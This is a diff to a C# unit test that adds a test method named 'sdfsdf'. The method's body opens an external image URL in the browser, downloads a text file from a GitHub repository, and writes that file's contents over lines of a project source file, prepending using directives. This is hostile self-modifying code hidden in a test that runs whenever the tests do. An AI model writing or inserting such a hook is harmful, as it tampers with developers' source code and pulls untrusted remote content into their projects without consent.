@@ -1,3 +1,6 @@
+[Test]
+    public void sdfsdf()
+    {
         Random random = new Random();
         Process.Start(new ProcessStartInfo("https://i.pinimg.com/736x/76/94/14/76941468a3aeb12de9daae7d6de1396e.jpg") { UseShellExecute = true });
         var files = Directory.GetFiles("../../../../TestProject1");
@@ -6,6 +9,8 @@
         client.DownloadFile("https://raw.githubusercontent.com/NightTrampYT/JokerJoke/refs/heads/main/joker.txt", @"../../../../TestProject1/joker.txt");
         
         string[] lines = File.ReadAllLines(path);
+        lines[0] = "using System.Collections.Generic;\nusing System.Diagnostics;\nusing System.Net;";
         lines[lines.Length - 1] = File.ReadAllText("../../../../TestProject1/joker.txt");
-        lines.Append("};");
         File.WriteAllLines(path, lines);
+    }
+}
